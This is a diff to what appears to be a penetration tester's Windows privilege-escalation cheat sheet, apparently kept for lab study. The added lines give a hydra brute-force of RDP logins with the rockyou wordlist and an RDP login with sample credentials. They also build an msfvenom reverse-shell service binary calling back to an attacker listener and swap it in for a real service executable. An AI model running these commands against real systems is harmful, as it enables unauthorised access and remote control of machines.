@@ -566,7 +566,11 @@ whoami
 net user <username>
  - net user administrator
  - net user admin
-CHECK IF net users have RDP access or not
+
+CHECK IF net users have RDP access or not - IF they do try use hyrda to bruteforce RDP login
+hydra -l user -P /usr/share/wordlists/rockyou.txt rdp://192.168.2.x
+Login using : xfreerdp /u:Tim /p:ashley /v:192.168.2.x
+
 
 systeminfo
 net config Workstation 
@@ -620,7 +624,19 @@ C:\Users\Public>cd Downloads
 C:\Users\Public\Downloads>windows-privesc-check2.exe --audit -a -o report
 windows-privesc-check v2.0svn198 (http://pentestmonkey.net/windows-privesc-check)...
 ```
+### Using sharppup
+```
+Transfer sharpup to machine
+run using .\sharp.exe audit
 
+When a service binary appears - create payload to replace that binary with a reverse shell
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.8.0.24 LPORT=443 EXIT_FUNC=thread -f exe-service -o service.exe
+
+overwrite the original service binary
+copy .\rev.exe C:\Service_Name\Service_Name.exe 
+
+get shell from listener
+```
 ### Running Mimikatz
 ```
 https://github.com/gentilkiwi/mimikatz
